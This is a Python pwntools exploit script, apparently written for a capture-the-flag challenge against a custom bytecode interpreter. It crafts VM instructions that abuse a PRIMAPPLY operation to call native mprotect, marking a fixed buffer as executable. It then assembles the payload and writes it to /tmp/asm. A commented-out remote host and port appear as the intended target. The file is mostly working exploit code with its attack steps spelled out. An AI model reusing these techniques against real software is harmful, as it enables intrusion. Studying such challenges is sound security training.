#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('interpreter', checksec=False)
# libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*0x0800804F
        b*0x00800802C
        b*0x08008082 
        b*0x08008118 
        b*0x0080087EE  
        c
        ''')
        sleep(1)


# if args.REMOTE:
#     p = remote('143.198.163.4', 1901)
# else:
#     p = process([exe.path])
#     # p.close()
# GDB()
buf = 0xeeee000 
buf_shifted = buf // 4
info(f'buf : {buf}')
mprotect = 0x0080087EA  

pop_rbp = 0x0000000008008186
# asm_code = (
#     'LOAD 0\n'
#     'VECTOR\n'
#     'LOAD 0\n'
#     'LAMBDA 7\n'

#     'LOAD 0\n'
#     'LT\n'

#     'load 62633984\n'
#     'LOAD NULL\n'

#     'CONS\n'

#     'LOAD 0\n'
#     'LOAD 0\n'
#     f'PRIMAPPLY {hex(mprotect)}\n'
#     'DONE\n'
# )
# Your new buffer address
buf_addr = 0xeeee000 

# main.py shifts integers left by 2 (v << 2). 
# We shift right by 2 to compensate so it lands perfectly as 0xeeee000 in memory.
# 0xeeee000 // 4 = 0x3bbb800 (62633984 in decimal)
buf_shifted = buf_addr // 4  

# TODO: Put the actual address of native mprotect here (Without the '0x' prefix)
# Find it via: objdump -d interpreter | grep mprotect
mprotect_addr_hex = 0x80087EA

# Defining the payload as a list of exact strings guarantees no weird blank lines
# or hidden formatting characters will crash main.py.
asm_lines = [
    "LOAD 0",
    "VECTOR",
    "LOAD 0",
    "LAMBDA 7",              # sets rdx = 7 (PROT_READ | PROT_WRITE | PROT_EXEC)
    "LOAD 0",
    "LT",                    # sets rdi = 0, rsi = 1 (1 byte, rounded up to full page by OS)
    f"LOAD {buf_shifted}",   # Pushes 62633984, which becomes 0xeeee000 in the VM
    "LOAD NULL",
    "CONS",                  # Creates list ( 0xeeee000 )
    "LOAD 0",
    "LOAD 0",                # Dummy values to push list to [rbx+0x10]
    f"PRIMAPPLY {hex(mprotect_addr_hex)}", # Unpacks list -> rdi = 0xeeee000, calls mprotect
    # "LOAD 0",
    # miss aligned
    "RETURN",
    "LOAD 0", 
    "LOAD 0", 

    f'LOAD {0xeeee000 //4}',
    "VECTORSET",
    "DONE"
]

# Explicitly join with '\n' and add a final '\n' so main.py processes the last line
asm_code = "\n".join(asm_lines) + "\n"

log.info("Compiling assembly via main.py...")

# Start the assembler process (adjust path if needed)
assembler = process(["python3", "src/assembler/main.py"])
# Send the text and read the raw compiled bytes back
assembler.send(asm_code)
compiled_payload = assembler.recvall()
print(compiled_payload)
assembler.close()

# # Save it to a file exactly as you requested
with open("/tmp/asm", "wb") as f:
    f.write(compiled_payload)
    
log.success(f"Saved {len(compiled_payload)} bytes to payload.bin")

# p = process([exe.path, "<", "payload.bin"])
# GDB()


# p.interactive()
